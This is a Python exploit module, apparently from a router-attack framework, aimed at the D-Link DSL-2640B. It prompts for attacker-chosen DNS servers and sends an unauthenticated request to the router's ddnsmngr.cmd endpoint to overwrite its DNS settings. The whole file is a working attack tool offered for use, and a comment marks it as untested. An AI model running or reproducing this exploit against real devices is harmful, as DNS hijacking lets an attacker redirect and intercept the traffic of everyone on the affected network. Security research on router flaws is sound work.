#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DSL-2640B DNS Change',
        'description': 'D-Link DSL-2640B allow changing DNS without credits',
        'reference': ['https://www.exploit-db.com/exploits/36105/'],
    }

    prompt = 'dsl_2640_dns_change'

    def __init__(self):
        super().__init__()
        self.primary_dns = ''
        self.second_dns = ''

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        if self.primary_dns == '':
            p_dns = input('Please input the PRIMARY DNS: ')
            if utils.valid_host(p_dns):
                self.primary_dns = p_dns
            else:
                self.run(host, port, timeout)

        if self.second_dns == '':
            s_dns = input('Please input the SECOND DNS: ')
            if utils.valid_host(s_dns):
                self.second_dns = s_dns
            else:
                self.run(host, port, timeout)

        utils.print_info('Using PRIMARY DNS: {}, SECOND DNS: {}'.format(self.primary_dns, self.second_dns))
        if self.input_to_continue():
            url = "http://{}:{}/ddnsmngr.cmd?action=apply&service=0&enbl=0&" \
                  "dnsPrimary={}&dnsSecondary={}&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP" \
                .format(host, port, self.primary_dns, self.second_dns)
            resp, err = self.http_post(self.s, url, timeout, None)
            if err:
                self.print_requests_err(host, port, err)
                return
            if resp.status_code == 200:
                utils.print_success("DNS settings has been changed")
            else:
                utils.print_failed("Could not change DNS settings")
        else:
            self.primary_dns = ''
            self.second_dns = ''

    def check(self, host, port, timeout):
        utils.print_warning('Impossible to check if target is affected')
        return False
